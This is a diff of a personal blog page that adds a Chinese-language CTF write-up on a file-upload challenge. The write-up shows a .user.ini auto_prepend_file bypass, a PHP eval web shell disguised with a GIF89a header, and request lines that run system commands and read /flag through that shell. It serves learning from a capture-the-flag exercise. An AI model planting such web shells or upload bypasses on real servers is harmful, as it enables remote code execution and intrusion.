@@ -3,7 +3,7 @@
 <html lang="en">
 <head>
     <meta charset="utf-8" />
-    <title>Tags: HTTP | 66+144</title>
+    <title>Checkln | 66+144</title>
     <meta name="author" content="LUEFLAM" />
     <meta name="description" content="" />
     <meta name="keywords" content="" />
@@ -31,6 +31,10 @@
 
 
 <script src="/MIA/js/lib/preview.js"></script>
+
+
+
+
 
 
 
@@ -144,123 +148,80 @@
 </transition>
 
         <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
-            <div id="archives">
-    
-    <div class="categories-tags">
-        
-        
-        
-        <span>
-            <a href="/MIA/tags/CTF/" style="background: #ff7d73">
-                <span class="icon">
-                    <i class="fa-solid fa-tags fa-fw"></i>
-                </span>
-                CTF
-            </a>
+            <div class="article">
+    <div>
+        <h1>Checkln</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/10/17
         </span>
         
         
-        
-        <span>
-            <a href="/MIA/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="background: #03a9f4">
-                <span class="icon">
-                    <i class="fa-solid fa-tags fa-fw"></i>
-                </span>
-                代码审计
-            </a>
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/MIA/tags/CTF/" style="color: #00a596">CTF</a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/MIA/tags/File-Upload/" style="color: #03a9f4">File Upload</a>
+            </span>
+            
         </span>
-        
-        
-        
-        <span>
-            <a href="/MIA/tags/HTTP/" style="background: linear-gradient(120deg, #9abbf7 0%, #ffbbf4 100%)">
-                <span class="icon">
-                    <i class="fa-solid fa-tags fa-fw"></i>
-                </span>
-                HTTP
-            </a>
-        </span>
-        
-        
-        
-        
-        
-        <span>
-            <a href="/MIA/tags/LEARN/" style="background: #ff7d73">
-                <span class="icon">
-                    <i class="fa-solid fa-tags fa-fw"></i>
-                </span>
-                LEARN
-            </a>
-        </span>
-        
-        
-        
-        <span>
-            <a href="/MIA/tags/TOOLs/" style="background: #03a9f4">
-                <span class="icon">
-                    <i class="fa-solid fa-tags fa-fw"></i>
-                </span>
-                TOOLs
-            </a>
-        </span>
-        
-        
-        
-        <span>
-            <a href="/MIA/tags/File-Upload/" style="background: #00bcd4">
-                <span class="icon">
-                    <i class="fa-solid fa-tags fa-fw"></i>
-                </span>
-                File Upload
-            </a>
-        </span>
-        
-        
-        
-        <span>
-            <a href="/MIA/tags/HEXO/" style="background: #ffa2c4">
-                <span class="icon">
-                    <i class="fa-solid fa-tags fa-fw"></i>
-                </span>
-                HEXO
-            </a>
-        </span>
-        
         
     </div>
     
-    <div class="timeline">
-        <div class="timeline-tail"></div>
-        <div class="timeline-content">
-            <div class="item-time">2023/10/17</div>
-            <a href="/MIA/2023/10/17/Begin-of-HTTP/">
-                <h3>2023NewStarCTF Begin of HTTP</h3>
-            </a>
-            <div class="info">
-                
-                
-                <span class="tags">
-                    <span class="icon">
-                        <i class="fa-solid fa-tags fa-fw"></i>
-                    </span>
-                    
-                    
-                    <span class="tag">
-                        
-                        <a href="/MIA/tags/CTF/" style="color: #00a596">CTF</a>
-                    </span>
-                    
-                    <span class="tag">
-                        
-                        <a href="/MIA/tags/HTTP/" style="color: #ff7d73">HTTP</a>
-                    </span>
-                    
-                </span>
-                
-            </div>
-        </div>
+    <div class="content" v-pre>
+        <p>又是随便点开的一个，好在，是文件上传。</p>
+<h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p>常规步骤之后，上传了<code>.htaccess</code>文件，不过发现被限制了。<br>返回了一个：</p>
+<pre><code class="SQL">exif_imagetype:not image!
+</code></pre>
+<span id="more"></span>
+
+<p><a href=https://www.php.net/manual/zh/function.exif-imagetype.php>exif_imagetype函数</a><br>简单来说就是，上传文件白名单机制。<br>QAQ<br>新英雄登场<br><code>.user.ini</code>文件<br>php目录配置文件，作用为：</p>
+<blockquote>
+<p>当我们访问目录中的任何php文件时，都会调用.user.ini中指的文件以php的形式进行读取。<br>文件内容为</p>
+</blockquote>
+<pre><code class="ini">GIF89a
+auto_prepend_file=po.jpg
+</code></pre>
+<p>之后就可以常规步骤一顿操作。</p>
+<h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p>这里也有了新一种方法<code>用传进去的cmd 进行rce</code>——其前提是传入的木马文件内容为：</p>
+<pre><code class="script">GIF89a 
+&lt;script language=&#39;php&#39;&gt;eval($_REQUEST[&#39;cmd&#39;]);&lt;/script&gt;
+</code></pre>
+<p>然后</p>
+<pre><code class="cmd">uploads/xxx/index.php?cmd=var_dump(scandir(&quot;/&quot;)); // 扫描当前目录下的文件，并打印出来
+
+uploads/xxx/index.php?cmd=system(&#39;cat /flag&#39;);
+
+uploads/xxx/index.php?cmd=var_dump(file_get_contents(&quot;/flag&quot;));
+</code></pre>
+<hr>
+<h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><p>ps：图片文件头前缀（作用是？）</p>
+<pre><code class="txt">JPG:FF D8 FF E0 00 10 4A 46 49 46（16进制编码）
+GIF：47 49 46 38 39 61（ascll值是GIF89a）
+PNG： 89 50 4E 47
+</code></pre>
+<p><a href=https://www.cnblogs.com/zhiliu/p/16825982.html>参考一下</a><br><a href=https://www.cnblogs.com/cjjcn/p/13954347.html>常见文件头&#x2F;尾总结</a><br>php解析文件值得关注</p>
+
     </div>
+    
+    
+    
+    
+    
+    
     
 </div>
 
@@ -292,6 +253,12 @@
         
     </div>
     <script src="/MIA/js/main.js"></script>
+    
+    
+
+
+
+
     
 </body>
 </html>
